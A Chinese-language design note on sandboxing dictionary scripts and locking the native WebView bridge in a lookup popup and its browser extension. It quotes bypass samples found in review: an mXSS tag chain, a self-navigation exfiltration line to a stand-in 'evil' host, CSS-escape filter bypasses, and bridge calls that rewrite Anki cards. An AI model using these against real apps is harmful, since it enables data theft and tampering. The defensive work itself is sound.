# 词典脚本沙箱 + 原生桥锁定（BUG-3762 / BUG-3765）

> 2026-10-23 所有者拍板：词典自带脚本保留，但必须跑在沙箱里，碰不到原生桥。

## 问题

查词弹窗（`fushi/assets/popup/popup.js` + `dict-media.js`）把词典 HTML 原样 `innerHTML` 进主文档，
`runDictScripts` 用 `new Function` 在主 frame 执行词典 `<script>`，window 代理对未知属性回落真 window，
于是恶意词典能 `window.flutter_inappwebview.callHandler('updateEntry', …)` 改写任意 Anki 卡、批量制卡、外联。

只把脚本挪进 `<iframe sandbox="allow-scripts" srcdoc>`（无 `allow-same-origin`）**不够**：

- Android：桥是 `addJavascriptInterface`，**所有 frame**（含沙箱 iframe）都拿得到 `flutter_inappwebview._callHandler`，原生不校验调用方。
- iOS / macOS：桥脚本 `forMainFrameOnly: false`，`messageHandlers` 所有 frame 可用。
- Linux：桥脚本默认注入所有 frame，`_bridgeSecret` 是脚本字面量，`_isMainFrame` 读了不用。
- Windows：WebView2 子 frame 的 `chrome.webview.postMessage` 是否进顶层 `WebMessageReceived` 待实测；原生收端不校验来源。

而桥**不能全局只认主 frame**：内置浏览器 / 网页流媒体等页面有合法的子 frame 调桥。所以锁定是**按页面显式开启**的。

## JS ↔ 原生契约：桥锁定（bridge lock）

各平台 vendored inappwebview 插件实现同一套语义：

1. **锁定请求**：页面在顶层 frame 调 `window.flutter_inappwebview.callHandler('_fushiLockBridge')`。
   这个名字由**桥脚本自己**拦截处理，不会分发到 app 注册的 handler。
2. **生成令牌**：原生为该 WebView 生成 ≥128 bit 随机令牌并保存，回传给**发起锁定的那个 frame 的桥脚本**。
   桥脚本把令牌存在闭包里（不挂到 window 上），然后把 Promise resolve 成字符串
   **`'fushi-bridge-locked-v1'`**（不用 `true`：没实现锁定的宿主适配器可能对未知 handler 回 true / null，
   页面只认这个专用值，其余一律当「未锁定」→ 不跑词典脚本）。
3. **锁定后**：该 WebView 收到的每一次 JS→原生调用（含插件内部 handler，如 `callAsyncJavaScript`）都必须带正确令牌，
   否则原生**丢弃并记一条 warn 日志**，不分发、不回调。桥脚本的 `callHandler` 包装自动附带令牌；
   插件内部若有绕过包装直接调原生入口的脚本，要改走同一个附令牌的内部函数。
4. **已锁定时再请求锁定**：拒绝（resolve `false`），保持原令牌。

其它加载 popup.js 的宿主（2026-11-01 补齐）：
- Android `:popup` 进程：原生 `PopupDictActivity` / `androidBridge` 已删（`1aea1ef0d9`），外部查词弹窗现在就是
  `PopupDictFlutterActivity` 里的 flutter_inappwebview，走上面 Android 插件那一套锁定，无需另做。
- app 外查词宿主（Windows `global_lookup_window.cpp`、macOS `GlobalLookupOverlay.swift`）：锁由顶层宿主页
  `global_lookup_host.js` 代 popup 子 frame 申请并持有令牌，原生按同一契约发令牌、校验、剥令牌后才转给 Dart，
  顶层新文档提交 / 宿主重载即解锁。macOS 的 `chrome.webview` 垫片在所有 frame 都有，第二道校验是
  `frameInfo.isMainFrame` + `fushi-popup://assets/global_lookup_host.html`。此前 macOS 原生不认锁请求、永远不回，
  宿主卡在 pending、之后的消息全部排队，整个 app 外查词哑掉——守卫 `macos_global_lookup_overlay_guard_static_test.dart`。

浏览器扩展没有原生桥，不走锁定：词典脚本跑在扩展自己的两层沙箱 frame 里（见下「浏览器扩展：两层沙箱 frame」）。
5. **解锁**：顶层 frame 开始新的导航 / 新文档提交时清空令牌（回到未锁定 = 旧行为）。子 frame 导航不影响。
6. **未锁定**：行为与改动前完全一致（其它页面零影响）。
7. **能拿到发送方 frame 信息的平台额外校验**：iOS / macOS 的 `WKScriptMessage.frameInfo.isMainFrame`、
   Windows 的 `WebMessageReceivedEventArgs::get_Source` 等——锁定后非顶层 frame 的消息一律丢弃（令牌之外的第二道）。

为什么令牌在 Android 上管用：沙箱 iframe 是不透明 origin，读不到顶层 frame 的 JS 闭包；它能调到 Java 接口对象，
但拿不出令牌。为什么时序安全：页面在渲染任何词典内容**之前**完成锁定（见下），恶意内容出现时桥已锁。

## 页面侧（popup.js）

- 平台就绪后先锁桥；**锁定成功之前不挂载任何词典沙箱 iframe**（挂载排队等 `bridgeLocked` Promise）。
  锁定失败（插件旧、平台不支持）→ 词典脚本不执行，只渲染净化后的静态内容。
- 结构化内容（Yomitan structured-content）标签 / 属性白名单，`on*`、`javascript:`、`srcdoc` 等一律不出。
- 不含 `<script>` 的 HTML 释义：净化后留在主文档（去 `on*` / 危险标签 / `javascript:` URL），交互照旧。
- 含 `<script>` 的 HTML 释义：整块放进 `<iframe sandbox="allow-scripts" srcdoc>`，脚本源码由父页面
  经 `getDictAsset` 取回后内联进 srcdoc；iframe 内由我们注入的小脚本把高度、链接点击、点词查词经
  `postMessage` 交给父页面，父页面按 `event.source` 认 iframe、按白名单处理消息。
- 浏览器扩展（`chrome.runtime.getURL` 给出 `chrome-extension://` 地址时）：不锁桥，`mountDictScriptSandbox`
  先放净化后的静态内容，再换成扩展的两层沙箱 frame（下节）；消息回来仍走同一个 `__dictSandboxHandleMessage`。

## 浏览器扩展：两层沙箱 frame

扩展里不能照搬 srcdoc 沙箱：弹窗挂在**别人的网页**里，嵌入方是宿主网页，它的 CSP 我们插不进 `frame-src 'none'`，
沙箱自导航外联没人在请求前拦（第二轮第 2 条）；manifest 里 `all_frames + match_about_blank + match_origin_as_fallback`
的 `frame-gate.js` 还会被注进 about:srcdoc。所以扩展用两层 frame（`tools/browser-extension/`）：

1. **外层 `dict-frame.html` + `dict-frame.js`**：普通扩展页（web_accessible_resources）。manifest
   `content_security_policy.extension_pages` = `script-src 'self'; object-src 'self'; frame-src 'self'`——它是内层的嵌入方，
   内层自导航到外网在请求发出前就被拦（落成错误页）。只做中继：父窗口（popup.js）在外层 load 后
   `postMessage({__fushiDictFrame:1,type:'connect'}, 扩展源, [port])`，外层只认第一份、来自 `window.parent` 的 connect，
   之后与父窗口只走这个 port，不理会父窗口（宿主网页脚本也能发）的 window message；port 上收一次 `render`，
   内层来的消息（origin `'null'`、source 是内层 window）按白名单 `height / error / link / select` 逐字段重建、封顶后转给 port。
   内层 iframe 带 `sandbox="allow-scripts"`（导航到本扩展别的页面也照样是沙箱）；渲染后超过两次 load（页面本身 +
   document.close 完成）即视为被导航走，拆掉。
2. **内层 `dict-sandbox.html`**：manifest `sandbox.pages`，`content_security_policy.sandbox` =
   `sandbox allow-scripts; default-src 'none'; script-src 'unsafe-inline' 'unsafe-eval'; style-src 'unsafe-inline' data:;
   img-src data: blob:; font-src data:; media-src data: blob:; connect-src 'none'; form-action 'none'; base-uri 'none'; frame-src 'none'`。
   内联引导脚本只收扩展源 parent 的一次 render，`document.open/write/close` 渲染（同一个 Document，manifest CSP 照旧生效；
   document.open 同时清掉引导监听）。文档仍是 `__dictSandboxDocument` 产出的那份（带 meta CSP 与 `DICT_SANDBOX_HELPER_JS`，
   helper 的 `parent` 就是外层）。Chrome 对网页里的嵌套扩展 frame 也查 web_accessible_resources，所以它也列进 WAR
   （网页直接嵌它拿不到任何东西：引导脚本只认扩展源 parent，页面里没有扩展 API）。
3. **媒体与外链脚本**：扩展分叉 `dict-media.js` 的占位媒体在主文档里兑现成本源 `blob:`，不透明源的沙箱页加载不了；
   `fushiDictSandboxInlineMedia` 在父侧把字节取回，`<img>` 内联成 `data:`、`<link>` 换成内联 `<style>`，再交给沙箱
   （token 只在 fetch 参数里）。外链 `<script src>` 经 bridge-shim 的 `getDictAsset`（同一条 `/api/media/dictionary` 端点）
   取源码，由 `__dictSandboxInlineScripts` 内联。

headless Chromium（playwright chromium-1208，`--load-extension`）实测：宿主页带 / 不带 `frame-src 'none'` CSP 都能挂上外层；
沙箱里 `origin=null`、无 `chrome.runtime`、`eval` 可用，`fetch` / 外网 `<img>` 被 CSP 拦、`data:` 图可加载，弹窗 / 顶层导航被
sandbox 拦，`location.href = 外网` 被外层 `frame-src 'self'` 在请求前拦（本地 HTTP 服务器零命中）且内层随即被拆；
非白名单类型与多余字段不出外层，宿主页抢发的第二个 connect 不被理会。

## 外联（BUG-3765）

在**内容层**切断，不在原生拦截器一刀切：弹窗 WebView 自己会 `new Audio(远程 URL)` 播在线发音
（JapanesePod101 等），拦截器拦掉所有 http(s) 会把这条合法路径一起拦死。

- 词典 CSS（styles.css、内联 `<style>`、`style` 属性）的 `@import` 整条删、外部 `url()` 换空。
- 结构化内容 `style` 值含 `url(` / `image-set(` / `expression(` 的整项丢弃。
- HTML 释义里会被浏览器自动请求的属性（`src` / `srcset` / `poster` / `background` …）指向外部地址的删掉；
  `<a href="https://…">` 保留（用户点了才经 `openLink` 打开）。
- 沙箱 iframe 自带 CSP：`default-src 'none'`、`connect-src 'none'`，图片 / 字体 / 媒体只认 `image:` / `dictmedia:` / `data:`。

## 第二轮：独立审查后补的三条（2026-10-23）

独立审查在真 Chrome 里复现了三类绕过，第一版的判断「主文档靠净化兜住、可以不加 CSP」不成立：

1. **mXSS**：净化器在 `<template>` 里净化后序列化成串、再 `innerHTML` 解析回主文档，两次解析上下文不同，
   `<math><mtext><table><mglyph><style><img onerror>` 在第二次解析时复活，主文档 JS 带着令牌调到 `updateEntry`
   ——桥锁定对主文档无效。导出卡片（`tempDiv.innerHTML = sanitizeHtml(…)`）与数组字符串释义
   （`sanitizeInlineHtml` → `appendRichTextLine`）是同一个毛病。
   → 净化与链接改写都在惰性树上做，`document.importNode` 直挂，全程不再序列化后重解析；math / svg 整个命名空间丢弃；
   `rewriteDictLinksInTree` 是两份 dict-media.js 分叉各自的 DOM 版（扩展分叉保留 token 占位语义）。
2. **沙箱自导航外联**：`location.href = 'https://evil/?w=…'`——srcdoc 里的 meta CSP 管不到导航后的新文档。
   → 主文档 CSP `frame-src 'none'` 在**请求发出前**拦（srcdoc 不是网络导航，不受影响）；iframe 再挂嵌入方 `csp` 属性；
   `load` 第二次触发即移除 frame。实测只有 frame-src 能挡住请求本身，后两道只管导航后的文档与消息。
3. **内容层外联过滤被绕过**：CSS 转义 `\75rl(` / `@\69mport`、`image-set('…')`、`imagesrcset`、`.mdd` 里原样返回的样式表。
   → 主文档 CSP（popup.js 加载时插入 meta，覆盖所有加载它的宿主；浏览器扩展里跳过，不能往别人的网页塞 CSP）：
   `img-src` / `font-src` / `style-src` 只认本机来源（`'self' image: dictmedia: data: blob: file: fushi-popup:
   https://fushi.local https://hibiki.popup`）。**`media-src` 额外放行 http(s)**：桌面 / iOS 的在线词条发音就是
   弹窗里 `new Audio(远程 URL)` 播的，只有 Android 交原生播放器；词典内容没有发起媒体请求的通路（净化器删媒体元素的外部
   `src`，CSS 载不了媒体）。

## 已知未做 / 降级

- **主文档 CSP 不管 `script-src`**：Windows / iOS 内联注入 `<script>`、其余平台走 `file://` / 自定义 scheme，
  没有真机覆盖就收紧脚本来源可能让弹窗在某个平台整页白屏。主文档脚本由「惰性树净化 + DOM 直挂」兜住。
- **WebKit 不认 iframe `csp` 属性**（Chromium 专有）：iOS / macOS / Linux 上沙箱自导航只靠主文档 `frame-src`。
- **锁定失败仍降级为静态内容**：所有加载 popup.js 的宿主都已实现锁定（或扩展的两层沙箱）；只有插件旧 / 原生拒锁时
  才不跑词典脚本。macOS 原生锁定没有真机验证（本机无 Mac，Swift 只过源码守卫）。
- **bfcache 恢复**：原生已清令牌、页面桥闭包仍持旧令牌。页面在 `pagehide` 拆掉全部沙箱，恢复后再锁会被拒，
  不再挂新沙箱（偏安全侧）。
- **扩展外层 connect 可被宿主页抢先**：宿主网页脚本能在 popup.js 之前往外层发 connect；外层只认第一份，
  被抢后真正的文档投不进去、词条停在静态内容（宿主页只能让自己页面上的弹窗降级，拿不到文档内容）。
- **沙箱内的交互是简化版**：点词只取点击处所在文本节点（最多 20 字），不走主文档 selection.js 的跨节点扫描；
  复制、键盘导航、瀑布流测高不进 iframe。只影响带脚本的 MDX 词条。

## 验证

- 各平台：锁定前后各发一次子 frame 调用，锁定后必须被丢弃；未锁定页面行为不变。
- 词典：带脚本的 MDX 条目在沙箱里照常渲染、点链接 / 点词能查；恶意条目调桥无效。
